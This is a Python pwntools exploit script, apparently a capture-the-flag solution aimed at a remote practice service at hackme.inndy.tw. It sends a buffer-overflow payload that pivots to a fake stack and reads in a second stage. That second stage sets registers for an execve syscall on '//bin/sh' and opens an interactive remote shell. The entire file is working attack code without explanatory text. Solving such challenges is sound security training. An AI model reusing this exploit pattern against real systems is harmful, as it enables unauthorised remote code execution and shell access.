from pwn import *

r = remote("hackme.inndy.tw", 7703)

###
# Ingredients
#
fake_stack_addr = p32(0x0804af20-0x4)
padding = "a"*12 + fake_stack_addr
overflow_syscall = p32(0x0804847c)
syscall = p32(0x8048320)
pop_eax_pop_edx_pop_ecx = p32(0x804843e)
write_shell_to_here = p32(0x0804af00)
shell_addr = p32(0x0804af48)
bin_sh1 = p32(0x69622f2f)
bin_sh2 = p32(0x68732f6e)


###
# Making Payload
#
payload = padding
payload += overflow_syscall
payload += p32(3)
payload += p32(0)
payload += write_shell_to_here
payload += p32(100)

payload2 = p32(0x804af48)
payload2 += p32(0)
payload2 += p32(0)
payload2 += p32(0)
payload2 += p32(0x187)
payload2 += p32(0x287)
payload2 += p32(0x387)
payload2 += p32(0x487)
payload2 += syscall
payload2 += p32(0)
payload2 += p32(11)#EAX
payload2 += shell_addr#EBX
payload2 += p32(0)#ECX
payload2 += p32(0)#EDX
payload2 += p32(0x7420650a)#ESI
payload2 += p32(0x3f736968)#EDI
payload2 += p32(0x0804af20)#EBP
payload2 += p32(0)
payload2 += bin_sh1
payload2 += bin_sh2
payload2 += p32(0)

###
# Interaction
#
r.sendline(payload)
r.recvn(1)
r.sendline(payload2)
r.interactive()

